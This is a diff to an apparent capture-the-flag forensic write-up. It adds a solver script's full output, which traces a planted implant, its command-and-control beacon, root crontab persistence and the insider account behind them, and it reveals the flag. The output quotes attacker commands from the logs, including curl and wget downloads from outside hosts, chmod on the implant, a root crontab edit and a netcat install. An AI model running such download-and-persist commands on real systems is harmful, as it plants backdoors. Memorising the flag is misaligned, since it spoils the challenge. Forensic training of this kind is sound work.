@@ -171,19 +171,49 @@ IP and the connection counts, not the port.
 
 ## Flag
 
+Full output of `python exploit.py files/corpo_rat.zip`:
+
 ```bash
 python exploit.py files/corpo_rat.zip
 ```
 
 ```text
+[*] doc artifact: files\corpo_rat.zip
+[*] audit.log: 3454 dong
+[*] auth.log: 3948 dong
+[*] cron.log: 679 dong
+[*] syslog: 944 dong
+[*] users.txt: 100 dong
+[*] roster: 98 user, uid 1000-1097
+[*] audit.log: 574 EXECVE, 2148 SYSCALL, 569 SOCKADDR
 [+] buoc 1: /tmp/.cache/.upd duoc EXECVE 568 lan, comm=".upd"
 [+] buoc 2: 569 SOCKADDR -> 2 dich: 203.0.113.77:8535 x568, 203.0.113.77:8443 x1
+[+] buoc 2: C2 = 203.0.113.77:8535 (568 lan beacon)
+[+]         lenh tai: curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
+[+]         lenh tai: wget -q http://198.51.100.44/tools/monitoring-agent.sh -O /tmp/agent.sh
 [+] buoc 3: cron.log co 569 dong CMD (/tmp/.cache/.upd ...)
 [+] cron.log: crontab[4711] (root) REPLACE (root) - sua crontab cua root
 [+] buoc 4: USER_CHAUTHTOK pid=4711 auid=1066 op=crontab-edit
 [+]         auid 1066 -> uid 1066 = lhackson = Lamar Hackson
+[+] buoc 5: audit:101167 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
+[+] buoc 5: audit:101170 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=chmod +x /tmp/.cache/.upd
+[+] buoc 5: audit:101173 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=crontab -u root -e
+[+] buoc 6: auth.log, sudo ghi boi lhackson:
+    Sep 20 02:14:30  sudo lhackson : USER=root ; COMMAND=/usr/bin/apt-get install netcat-traditional
+    Sep 20 02:15:12  sudo lhackson : USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
+    Sep 20 02:15:39  sudo lhackson : USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/.upd
+    Sep 20 02:17:10  sudo lhackson : USER=root ; COMMAND=/usr/bin/crontab -u root -e
+    Sep 23 13:22:07  sudo lhackson : USER=root ; COMMAND=/bin/ls -la /tmp/.cache/
+[+]         3 lenh cai implant co mat nguyen van trong sudo.log
+[+] buoc 7: lhackson vung ve 10.50.12.188 (9 phien)
+    Sep 20 02:14:14  sshd[4344] Accepted password for lhackson from 10.50.44.233
+    IP 10.50.44.233 xuat hien 2 dong trong auth.log, chi phuc vu ['lhackson']
+[+]         audit SYSCALL co ppid thuoc sshd['4344']: 3 dong, auid = [1066] (ppid trong audit = pid cua sshd)
+[+] buoc 8: curl uid=0 -> /tmp/.cache/.upd | cron=569, EXECVE=568 -> implant
+[+] buoc 8: wget uid=0 -> /tmp/agent.sh | cron=0, EXECVE=0 -> loai: tai mot lan, khong cron, khong beacon
 [+] nhan: lhackson (uid 1066), Lamar Hackson, Finance, sudo=no
 [+] flag: cdctf{Lamar Hackson}
+[+] da luu flag.txt
 ```
 
 ## Reproduce
